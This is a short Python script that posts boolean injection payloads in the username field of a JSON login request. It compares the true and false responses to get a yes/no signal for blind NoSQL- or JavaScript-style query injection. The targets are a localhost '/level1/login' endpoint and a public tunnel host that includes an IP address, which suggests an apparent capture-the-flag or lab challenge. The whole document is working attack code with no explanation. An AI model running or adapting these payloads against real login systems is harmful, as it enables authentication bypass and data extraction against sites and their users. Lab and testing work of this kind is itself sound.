```python
import requests
import json

def test_boolean_payloads(url):
    # Test the boolean payloads that work locally
    true_payload = {"username": "' || 'a'=='a' || 'a'=='a", "password": "test"}
    false_payload = {"username": "' && 'a'!='a' && 'a'!='a", "password": "test"}
    
    print(f"\nTesting: {url}")
    
    print("\nTRUE payload:")
    r1 = requests.post(url, json=true_payload)
    print(f"Status: {r1.status_code}")
    print(f"Headers: {dict(r1.headers)}")
    print(f"Body: {r1.text}")
    print(f"Length: {len(r1.text)}")
    
    print("\nFALSE payload:")
    r2 = requests.post(url, json=false_payload)
    print(f"Status: {r2.status_code}")
    print(f"Headers: {dict(r2.headers)}")
    print(f"Body: {r2.text}")
    print(f"Length: {len(r2.text)}")
    
    # Compare
    print(f"\nComparison:")
    print(f"Same status: {r1.status_code == r2.status_code}")
    print(f"Same body: {r1.text == r2.text}")
    print(f"Body length diff: {len(r1.text) - len(r2.text)}")

# Test both
test_boolean_payloads("http://localhost:3000/level1/login")
test_boolean_payloads("http://thzse-213-245-98-157.a.free.pinggy.link/level1/login")
```
